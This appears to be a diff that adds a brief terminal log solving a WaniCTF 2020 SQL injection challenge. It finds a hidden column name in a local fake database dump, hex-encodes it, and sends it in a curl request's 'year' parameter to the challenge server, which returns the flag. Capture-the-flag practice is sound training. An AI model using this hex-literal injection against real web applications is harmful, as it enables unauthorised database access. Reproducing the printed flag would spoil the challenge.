@@ -1,0 +1,14 @@
+seth@pyramid:~/Desktop/ctf/wanictf-2020/web/sql-challenge-2/sql-chall2-fake/mysql/initdb.d$ cat anime.csv | grep "FAKE"
+"FAKE{this_is_a_fake_flag}","fl46_5b438f8c11a5aade00a66bea6f7"
+
+convert fl46_5b438f8c11a5aade00a66bea6f7 to hex
+
+
+seth@pyramid:~/Desktop/ctf/wanictf-2020/web/sql-challenge-2/sql-chall2-fake/mysql/initdb.d$ curl https://sql2.wanictf.org/index.php?year=0x666c34365f356234333866386331316135616164653030613636626561366637 | grep "FLAG{"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1572  100  1572    0     0    477      0  0:00:03  0:00:03 --:--:--   477
+<tr><th>FLAG{5ql_ch4r_cf_ca87b27723}</th><th>fl46_5b438f8c11a5aade00a66bea6f7</th></tr>
+
+
+
